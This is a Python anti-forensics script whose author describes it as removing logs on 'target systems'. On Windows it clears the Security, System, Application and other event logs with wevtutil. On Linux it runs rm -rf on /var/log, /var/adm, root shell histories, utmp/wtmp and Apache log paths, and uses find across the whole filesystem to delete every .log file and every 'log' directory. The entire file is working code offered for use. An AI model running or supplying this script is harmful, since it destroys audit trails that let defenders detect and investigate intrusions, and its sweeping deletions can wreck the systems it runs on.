#!/usr/bin/env python3
#---------------------
__author__ = 'C4ssif3r[Mr-Expl0it] MJi A.S.P.I.R.I.N'
__telegram_ID__ = '@creator_typeri'
__instagram_ID__ = '@Mji_Devil'
__about__ = ''' this script removing automatically LOG[s] in the your target systems
only run this script with python 3.x and wait for cleaning LOG[s] ;) '''
#---------------------
# check and installing requirements 
#---------------------

try:
    from os import getuid, system
    from subprocess import check_output
    from colorama import init, Fore
    import sys
    from time import sleep
except:
    print ('[!] please installing libs on requirements.txt file \n with command ~> pip install -r requirements.txt [ if pip not worked try with pip3 ]')
    sys.exit()
#------------------
# Mji Was Here .

init()

def banner():

    print (Fore.GREEN+'''
    
       __   __        __                            
 /    /  | /         /    /                         
(    (   |( __      (    (  ___  ___  ___  ___  ___ 
|   )|   )|   )     |   )| |___)|   )|   )|___)|   )
|__/ |__/ |__/      |__/ | |__  |__/||  / |__  |    
\n''')
    sleep(2.0)
    print (Fore.RED+'        [#]'+Fore.WHITE+'AUTHOR : Mji [ MR EXPL0iT ]')
    sleep(1.5)
    print (Fore.RED+'        [#]'+Fore.WHITE+'Automaticallu clearing logs')
    sleep(1.3)
    print (Fore.RED+'        [#]'+Fore.WHITE+'TELEGRAM : @creator_Typeri')
    sleep(1.0)
    print (Fore.RED+'        [#]'+Fore.WHITE+'INSTAGRAM [IG] : @MjiDevil\n\n\n')
    sleep(3.0)

banner()


def windows():
    print(Fore.GREEN+"[+]"+Fore.YELLOW+"Clearing windows logs [ verbose ]")
    eventlogs = ['Security' , 'Application' , 'System' , 'Setup', 'Internet Explorer']

    for event in eventlogs:
        try:
            check_output(["wevtutil.exe" , "cl" , event.strip("\r")])
            print(Fore.CYAN+"[+]"+Fore.GREEN+"{} Logs Deleted Successfully .\n".format(event))
        except:
            print(Fore.RED+"[-]"+Fore.YELLOW+"{} Logs not Deleted Successfully .\n".format(event))

def linux():

    print(Fore.GREEN+"[+]"+Fore.YELLOW+"Clearing Linux logs [ no verbose ]"+Fore.WHITE+"")
    a1 = system('rm -rf /tmp/logs')
    a2 = system('rm -rf $HISTFILE')
    a3 = system('rm -rf /root/.ksh_history')
    a4 = system('rm -rf /root/.bash_history')
    ox = system('rm -rf /root/.bash_logout')
    a5 = system('rm -rf /root/.bash_logout')
    a6 = system('rm -rf /usr/local/apache/logs')
    a7 = system('rm -rf /usr/local/apache/log')
    a8 = system('rm -rf /var/apache/logs')
    a9 = system('rm -rf /var/apache/log')
    a0 = system('rm -rf /var/run/utmp')
    a09 = system('rm -rf /var/logs')
    s1 = system('rm -rf /var/log')
    s2 = system('rm -rf /var/adm')
    s3 = system('rm -rf /etc/wtmp')
    s4 = system('rm -rf /etc/utmp')
    s5 = system('find / -name *.bash_history -exec rm -rf {} \;')
    s6 = system('find / -name *.bash_logout -exec rm -rf {} \;')
    s7 = system('find / -name "log" -exec rm -rf {} \;')
    s8 = system('find / -name *.log -exec rm -rf {} \;')
    sys_i = getuid()
    if sys_i != 0:
        print (Fore.RED+'\n[-]'+Fore.YELLOW+' WARNiNG '+Fore.WHITE+' plz try with root user')
    else:
        print (Fore.CYAN+'\n[+]'+Fore.GREEN+' WARNiNG '+Fore.WHITE+' logs Deleted Succesess .\n')

os_name = sys.platform


os_name_input = input (Fore.WHITE+"Plz Enter your platform ['linux'] or ['windows'] ~>"+Fore.YELLOW+" ")

if os_name_input == 'linux':
    print (Fore.GREEN+'[!] '+Fore.WHITE+'Your system is {} and you selected {} platform\n'.format(os_name,os_name_input))
    linux()
    print(Fore.WHITE+' ')
if os_name_input == 'windows':
    print (Fore.GREEN+'[!] '+Fore.WHITE+'Your system is {} and you selected {} platform\n'.format(os_name,os_name_input))
    windows()
    print(Fore.WHITE+' ')
else:
    print (Fore.RED+'\n[x]'+Fore.YELLOW+' [error by user] '+Fore.WHITE+'tool only support "linux" and "windows" platform[s] enter linux or windows not other words [!] ')
    sys.exit()
